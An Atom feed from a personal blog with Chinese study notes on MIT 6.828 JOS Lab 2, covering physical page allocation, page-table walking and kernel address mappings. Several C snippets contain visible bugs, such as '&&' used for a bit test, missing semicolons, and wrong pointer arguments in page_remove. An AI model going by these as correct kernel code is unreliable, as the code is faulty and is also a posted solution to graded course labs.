<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C7</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://billyotry.github.io/"/>
  <updated>2021-02-28T13:21:57.128Z</updated>
  <id>https://billyotry.github.io/</id>
  
  <author>
    <name>C7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>这是标题</title>
    <link href="https://billyotry.github.io/2099/01/01/test/"/>
    <id>https://billyotry.github.io/2099/01/01/test/</id>
    <published>2098-12-31T16:00:00.000Z</published>
    <updated>2021-02-28T13:21:57.128Z</updated>
    
    <content type="html"><![CDATA[<p><strong>just a test</strong></p><p> <img src="https://inews.gtimg.com/newsapp_ls/0/13071917630/0" alt="backgroud"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;just a test&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://inews.gtimg.com/newsapp_ls/0/13071917630/0&quot; alt=&quot;backgroud&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab2-Exercise5</title>
    <link href="https://billyotry.github.io/2021/08/02/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise5/"/>
    <id>https://billyotry.github.io/2021/08/02/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise5/</id>
    <published>2021-08-02T13:14:38.032Z</published>
    <updated>2021-08-02T13:20:47.121Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>继续完善mem_init()函数，你的程序现在必须能够通过check_kern_pgdir()和check_page_installed_pgdir()函数的检测。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>剩下的工作就是完善mem_init函数，现在要完善的功能就是把关于操作系统的一些重要的地址映射到现在的新的页目录项上。可以利用之前的boot_map_region函数。</p><p>首先我们要映射的范围是把pages数组映射到线性地址UPAGES，大小为一个PTSIZE。</p><p>所以我们添加的代码为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, UPAGES, PTSIZE, PADDR(pages), PTE_U);</span><br></pre></td></tr></table></figure><p>其中perm变量之所以设置为PTE_U，是因为这部分空间是kernel space和user space中的代码都能访问的，所以要设置PTE_U。</p><p>然后映射内核的堆栈区域，把由bootstack变量所标记的物理地址范围映射给内核的堆栈。内核堆栈的虚拟地址范围是[KSTACKTOP-PTSIZE, KSTACKTOP)，不过要把这个范围划分成两部分：</p><ul><li>[KSTACKTOP-KSTKSIZE, KSTACKTOP) 这部分映射关系加入的页表中。</li><li>[KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) 这部分不进行映射。</li></ul><p>对这部分地址的访问权限是，kernel space 可以读写，user space 无权访问，所以代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir,KSTACKTOP-KSTKSIZE,KSTKSIZE,PADDR(bootstack),PTE_W);</span><br></pre></td></tr></table></figure><p>最后映射整个操作系统内核，虚拟地址范围是[KERNBASE, 2^32]，物理地址范围是[0，2^32 - KERNBASE]。</p><p>访问权限是，kernel space 可以读写，user space 无权访问，所以代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, KERNBASE, <span class="number">0xffffffff</span> - KERNBASE, <span class="number">0</span>, PTE_W);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;继续完善mem_init()函数，你的程序现在必须能够通过check_kern_pgdir()和check_page_installed_p
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab2-Exercise4</title>
    <link href="https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise4/"/>
    <id>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise4/</id>
    <published>2021-08-01T08:59:45.661Z</published>
    <updated>2021-08-02T08:35:33.584Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在kern/pmap.c中必须实现pgdir_walk()  boot_map_region()  page_lookup()  page_remove()  page_insert()函数。</p><p>mem_init中的check_page函数会检查我们的页表管理程序。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>pgdir_walk其实在注释中就说的很清楚了,通过线性地址va来返回对应页表项的地址，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pte_t</span> *</span><br><span class="line">pgdir_walk(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">int</span> create)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">uint32_t</span> pdx = PDX(va);<span class="comment">//(va&gt;&gt;22)&amp;&amp;0x3ff高10位页目录项索引</span></span><br><span class="line"><span class="keyword">uint32_t</span> ptx = PTX(va);<span class="comment">//(va&gt;&gt;12)&amp;&amp;0x3ff中间10位页表项索引</span></span><br><span class="line"><span class="keyword">pte_t</span> *pde;<span class="comment">//页目录项指针</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte;<span class="comment">//页表项指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"></span><br><span class="line">pde = &amp;pgdir[pdx] <span class="comment">//页目录项的地址</span></span><br><span class="line"><span class="keyword">if</span>(*pde &amp;&amp; PTE_P)&#123; </span><br><span class="line"><span class="comment">//二级页表存在</span></span><br><span class="line"><span class="comment">//PTE_ADDR得到物理地址，然后转化位虚拟地址，得到页表的虚拟地址</span></span><br><span class="line">pte = (KADDR(PTE_ADDR(*pde)))</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!create)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">pp = page_alloc(ALLOC_ZERO);</span><br><span class="line"><span class="keyword">if</span>(!pp)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">pte = (<span class="keyword">pte_t</span>*)page2kva(pp);</span><br><span class="line">pp-&gt;pp_ref ++;</span><br><span class="line"><span class="comment">//设置页目录项</span></span><br><span class="line">*pde = PADDR(pte) | (PTE_P | PTE_W | PTE_U);<span class="comment">//present writeable user</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;pte[ptx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是boot_map_region函数，把虚拟地址空间范围[va, va+size)映射到物理空间[pa, pa+size)的映射关系加入到页表pgdir中。这个函数主要的目的是为了设置虚拟地址UTOP之上的地址范围，这一部分的地址映射是静态的，在操作系统的运行过程中不会改变，所以这个页的PageInfo结构体中的pp_ref域的值不会发生改变。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">boot_map_region(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> va, <span class="keyword">size_t</span> size, <span class="keyword">physaddr_t</span> pa, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="comment">//计算总共有多少页</span></span><br><span class="line"><span class="keyword">size_t</span> pgs = size / PGSIZE;</span><br><span class="line"><span class="keyword">if</span>(size % PGSIZE != <span class="number">0</span>)&#123; <span class="comment">//这里要注意页对齐，如果多出来几个字节，需多分配一个页</span></span><br><span class="line">pgs++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; pgs;i++)&#123;</span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,(<span class="keyword">void</span>*)va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(pte == <span class="literal">NULL</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;boot_map_region(): out of memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">*pte = pa | perm | PTE_P;</span><br><span class="line">va += PGSIZE;</span><br><span class="line">pa += PGSIZE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是page_insert函数，把一个物理内存中页pp与虚拟地址va建立映射关系。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">page_insert(<span class="keyword">pde_t</span> *pgdir, struct PageInfo *pp, <span class="keyword">void</span> *va, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!pte)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br><span class="line">pp-&gt;pp_ref ++;</span><br><span class="line"><span class="comment">//if is already mapped</span></span><br><span class="line"><span class="keyword">if</span>(*pte &amp; PTE_P)&#123;</span><br><span class="line">page_remove(pgdir,va);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pte = page2pa(pp) | perm | PTE_P;</span><br><span class="line"><span class="comment">//pp-&gt;pp_ref ++;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里提一点这个pp_ref++的位置，因为如果是先执行page_remove的话，如果将ref刚好置零那么此时就会释放了这个page，所以要在page_remove之前先将ref加一。</p><p>接着就是page_lookup函数，返回虚拟地址va所映射的物理页的pageinfo</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class"><span class="title">page_lookup</span>(<span class="title">pde_t</span> *<span class="title">pgdir</span>, <span class="title">void</span> *<span class="title">va</span>, <span class="title">pte_t</span> **<span class="title">pte_store</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!pte)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pte_store)&#123;</span><br><span class="line">*pte_store = pte;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(*pte &amp; PTE_P))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">pp = pa2page(PTE_ADDR(*pte));</span><br><span class="line"><span class="keyword">return</span> pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是page_remove函数了，就是把虚拟地址va和物理页的映射关系删除</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_remove(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">void</span> *va)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> * <span class="title">pp</span> =</span> page_lookup(pgdir,va,pte);</span><br><span class="line"><span class="keyword">if</span>(!pp)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_decref(pp);<span class="comment">//ref值减一</span></span><br><span class="line">tlb_invalidate(pgdir,va);</span><br><span class="line">*pte = <span class="number">0</span>;<span class="comment">//页表项内容置零</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;在kern/pmap.c中必须实现pgdir_walk()  boot_map_region()  page_lookup()  page_
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab2-Exercise3</title>
    <link href="https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise3/"/>
    <id>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise3/</id>
    <published>2021-08-01T02:59:17.371Z</published>
    <updated>2021-08-01T09:00:24.082Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>通过GDB我们只能通过虚拟地址来查看内存所存放的内容，但是如果能访问到物理内存的话，肯定会更有帮助的。们可以看一下QEMU中的一些常用指令，特别是xp指令，可以允许我们去访问物理内存地址。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>由于官方给的进入moniter的方式在我这不好使，用如下命令进入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -hda obj&#x2F;kern&#x2F;kernel.img -monitor stdio -gdb tcp::26000 -D qemu.log  </span><br></pre></td></tr></table></figure><p>　  打开monitor后，我们可以输入如下比较常见的指令：</p><p>　　xp/Nx paddr – 查看paddr物理地址处开始的，N个字的16进制的表示结果。</p><p>　　info registers – 展示所有内部寄存器的状态。</p><p>　　info mem – 展示所有已经被页表映射的虚拟地址空间，以及它们的访问优先级。</p><p>　　info pg – 展示当前页表的结构。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13837151323/0" alt="image-20210801162042097"></p><p>然后是我们的虚拟地址空间</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13837152481/0" alt="image-20210801162103534"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;通过GDB我们只能通过虚拟地址来查看内存所存放的内容，但是如果能访问到物理内存的话，肯定会更有帮助的。们可以看一下QEMU中的一些常用指令，
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab2-Exercise1</title>
    <link href="https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise1/"/>
    <id>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise1/</id>
    <published>2021-07-30T08:41:44.114Z</published>
    <updated>2021-08-01T03:01:29.088Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在文件 kern/pmap.c 中，你必须要完成以下几个子函数的代码</p><p>boot_alloc();  mem_init();  page_init();   page_alloc();   page_free();</p><p>check_page_free_list()和check_page_alloc()两个函数将会检测你写的页分配器代码是否正确。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这部分我们需要写一个物理内存页的allocator。要求实现kern/pmap.c文件中的boot_alloc()，mem_init()，page_init()，page_alloc()，page_free()。check_page_free_list()和check_page_alloc()中会有一些测试用例，如果没有通过两个函数则说明代码有问题。</p><p>从lab1中我们知道，进入内核后首先调用的是i386_init函数，然后我们查看该函数，它会调用mem_init函数。然后mem_init函数又会调用其他的工具函数实现内核的内存管理。该函数首先调用i386_detect_memory函数来计算有多少物理内存页保存到npages和npages_basemem两个全局变量中，npages记录整个内存的页数，npages_basemem记录basemem的页数。</p><p>之前我们介绍过了，jos把整个物理内存划分成了三个部分：</p><ol><li>0x00000~0xA0000，这部分叫basemem，是可用的。</li><li>0xA0000~0x100000，这部分叫IO hole，是不可用的，主要用来被分配给外部设备。</li><li>0x100000~xxx，这部分就是0x100000往上的空间了，叫做extmem，是可用的，是最重要的内存区域。</li></ol><p>执行完这个函数之后，下两条指令是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kern_pgdir = (<span class="keyword">pde_t</span> *) boot_alloc(PGSIZE);</span><br><span class="line"><span class="built_in">memset</span>(kern_pgdir, <span class="number">0</span>, PGSIZE);</span><br></pre></td></tr></table></figure><p>其中kern_pgdir是一个指针，pde_t *kern_pgdir是一个指向操作系统页目录表的指针，操作系统之后工作在虚拟内存模式下，就需要这个页目录表进行地址转换。我们为这个页目录表分配的内存空间大小为一页大小，然后把这部分内存清空。</p><p>这里调用了boot_alloc函数，这个是我们首要实现的函数了，该函数就如注释中所说，它只是暂时当作页分配器，之后使用的真实的页分配器是page_alloc函数。</p><p>boot_alloc函数的核心思想就是维护一个静态变量nextfree，里面存放着下一个可以使用的空闲内存空间的虚拟地址，所以当我们每次想要分配n个字节的内存时，我们都需要修改这个变量的值。</p><p>所以添加代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = nextfree;</span><br><span class="line">nextfree = ROUNDUP((nextfree + n),PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(nextfree - KERNBASE &gt; npages*PGSIZE)&#123;</span><br><span class="line">panic(<span class="string">&quot;Out of memory!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>接下来注释中要求我们分配一块内存，用来存放一个struct PageInfo的数组，数组中的每一个PageInfo代表内存当中的一页。操作系统通过这个数组来追踪所有内存页的使用情况。那么添加如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pages = (struct PageInfo*)boot_alloc(npages * <span class="keyword">sizeof</span>(struct PageInfo));</span><br><span class="line"><span class="built_in">memset</span>(pages,<span class="number">0</span>,npages * <span class="keyword">sizeof</span>(struct PageInfo));</span><br></pre></td></tr></table></figure><p>接下来就要调用page_init函数，我们可以到这个函数的定义处具体查看，整个函数大体是由一个for循环构成，遍历所有内存页所对应的在数组中的结构体，并且根据当前页的状态来修改这个结构体的状态，如果页被占用，那么要把这个结构体中的pp_ref置1；如果是空闲页，则把这个页表送入到pages_free_list页表中。根据注释中的提示，第0页已经被占用，io hole部分被占用，extmem也有部分已经被占用，所以添加代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mark page 0 as in use --1</span></span><br><span class="line">pages[<span class="number">0</span>].pp_ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[PGSIZE,npages_basemem*PGSIZE) is avilable --2</span></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i &lt; npages_basemem;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[IOPHYSMEM, EXTPHYSMEM) is never be allocated --3</span></span><br><span class="line"><span class="keyword">for</span>(;i&lt;EXTPHYSMEM/PGSIZE;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[EXTPHYSMEM, ...) --4</span></span><br><span class="line"><span class="comment">//in this part,we need to know which pages has been used for pages-table or page-directory or kernel</span></span><br><span class="line"><span class="keyword">physaddr_t</span> lasted_in_use_address = PADDR(boot_alloc(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">size_t</span> last_number = lasted_in_use_address/PGSIZE;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;last_number;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//other pages for free</span></span><br><span class="line"><span class="keyword">for</span>(;i &lt; npages;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化关于所有物理内存页的相关数据结构后，进入check_page_free_list(1)子函数，这个函数的功能就是检查page_free_list链表的所谓空闲页，是否真的都是合法的，空闲的。接下来调用check_page_alloc函数，所以我们要实现page_alloc和page_free函数。</p><p>通过注释我们可以知道知道这个函数的功能就是分配一个物理页，然后返回值就是这个物理页对应的PageInfo结构体。</p><p>首先我们可以知道我们所用到的结构如下图：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13835464680/0" alt="image-20210731234539766"></p><p>然后我们的page_alloc的实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class"><span class="title">page_alloc</span>(<span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">result</span> =</span> page_free_list;</span><br><span class="line"><span class="comment">//cprintf(&quot;result = %lx\n&quot;,result);</span></span><br><span class="line"><span class="keyword">if</span>(!page_free_list)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_free_list = result-&gt;pp_link;</span><br><span class="line">result-&gt;pp_link = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(alloc_flags&amp;ALLOC_ZERO)&#123;</span><br><span class="line"><span class="built_in">memset</span>(page2kva(result),<span class="number">0</span>,PGSIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是我们的page_free函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_free(struct PageInfo *pp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span></span><br><span class="line"><span class="comment">// pp-&gt;pp_link is not NULL.</span></span><br><span class="line"><span class="keyword">if</span>(pp-&gt;pp_link || pp-&gt;pp_ref)&#123;</span><br><span class="line">panic(<span class="string">&quot;page_free: pp-&gt;pp_ref is nonzero or pp-&gt;pp_link is not NULL&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">pp-&gt;pp_link = page_free_list;</span><br><span class="line">page_free_list = pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新回到mem_init()的流程中来，在调用page_init()后，会调用check_page_free_list(1)和check_page_alloc()。这两个函数通过一系列断言，判断我们的实现是否符合预期。需要注意的是check_page_free_list()中的这段代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (only_low_memory) &#123;</span><br><span class="line"><span class="comment">// Move pages with lower addresses first in the free</span></span><br><span class="line"><span class="comment">// list, since entry_pgdir does not map all pages.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp1</span>, *<span class="title">pp2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> **<span class="title">tp</span>[2] =</span> &#123; &amp;pp1, &amp;pp2 &#125;;</span><br><span class="line"><span class="keyword">for</span> (pp = page_free_list; pp; pp = pp-&gt;pp_link) &#123;</span><br><span class="line"><span class="keyword">int</span> pagetype = PDX(page2pa(pp)) &gt;= pdx_limit;</span><br><span class="line">*tp[pagetype] = pp;</span><br><span class="line">tp[pagetype] = &amp;pp-&gt;pp_link;</span><br><span class="line">&#125;<span class="comment">//执行该for循环后，pp1指向（0~4M）中地址最大的那个页的PageInfo结构。pp2指向所有页中地址最大的那个PageInfo结构</span></span><br><span class="line">*tp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">*tp[<span class="number">0</span>] = pp2;</span><br><span class="line">page_free_list = pp1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要就是调整page_free_list链表的顺序，从我之前的图就能知道之前链表的顺序是从高地址到低地址分配的，现在调整后分配顺序就可以从低地址到高地址了。</p><blockquote><p>提一点就是现在映射的都是物理地址的0到0x100000映射到虚拟地址0xf0100000往后。</p></blockquote><p>附一张物理内存布局图</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_2_physical_memory_after_pages.png" alt="执行mem_init()后的物理内存"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;在文件 kern/pmap.c 中，你必须要完成以下几个子函数的代码&lt;/p&gt;
&lt;p&gt;boot_alloc();  mem_init();  
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】JOS学习笔记 Lab2</title>
    <link href="https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab2/"/>
    <id>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab2/</id>
    <published>2021-07-30T01:39:54.940Z</published>
    <updated>2021-08-02T13:21:33.289Z</updated>
    
    <content type="html"><![CDATA[<p>lab2中多出来了几个文件：</p><p>inc/memlayout.h</p><p>kern/pmap.c</p><p>kern/pmap.h</p><p>kern/kclock.h</p><p>kern/kclock.c</p><p>memlayout.h描述了虚拟地址空间的布局，我们需要通过修改pmap.c文件来实现这个结构。memlayout.h和pmap.h文件定义了一个PageInfo结构，利用这个结构可以记录哪些物理页是空闲的。kclock.c和kclock.h文件中操作的是用电池充电的时钟，以及CMOS RAM设备。在这个设备中记录着PC机拥有的物理内存的数量。在pmap.c中的代码必须读取这个设备的信息才能弄清楚到底有多少内存。</p><h2 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h2><p>操作系统必须要追踪记录哪些物理内存区域是可用的，哪些是被占用的。JOS内核以页(page)为最小粒度来管理内存的，它使用MMU来映射，保护每一块被分配出去的内存。</p><p>在这里要具体编写一个物理内存页的分配子函数。它利用一个结构体PageInfo的链表来记录哪些页是空闲的，链表中的每一个节点对于一个物理页。我们需要先编写物理页面分配器，然后才能编写虚拟内存实现，因为页表管理自身也需要分配物理内存来存储页表。</p><h2 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h2><h3 id="Virtual-Linear-and-Physical-Addresses"><a href="#Virtual-Linear-and-Physical-Addresses" class="headerlink" title="Virtual, Linear, and Physical Addresses"></a>Virtual, Linear, and Physical Addresses</h3><p>在x86体系中，一个虚拟地址是由两部分组成，一个是段选择子，另一个是段内偏移。一个线性地址指的是通过段地址转换机制把虚拟地址转换之后得到的地址。一个物理地址指的是分页地址机制把线性地址进行转换之后得到的真是的内存地址，这个地址最终将会送到内存芯片的地址总线上。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">           Selector  +--------------+         +-----------+</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     | Segmentation |         |  Paging   |</span><br><span class="line">Software             |              |--------&gt;|           |----------&gt;  RAM</span><br><span class="line">            Offset   |  Mechanism   |         | Mechanism |</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     +--------------+         +-----------+</span><br><span class="line">            Virtual                   Linear                Physical</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在boot/boot.S文件中，我们引入了一个全局描述符表，这个表通过把所有段的基址设置为0，界限设置为0xffffffff的方式，关闭了分段的功能，所以虚拟地址中的选择子的部分就完全没有了意义，那么线性地址中的值就总是等于虚拟地址中段内偏移的值。在lab1中已经安装了一个简易的页目录和页表，将虚拟地址[0, 4MB)映射到物理地址[0, 4MB)，[0xF0000000, 0xF0000000+4MB)映射到[0, 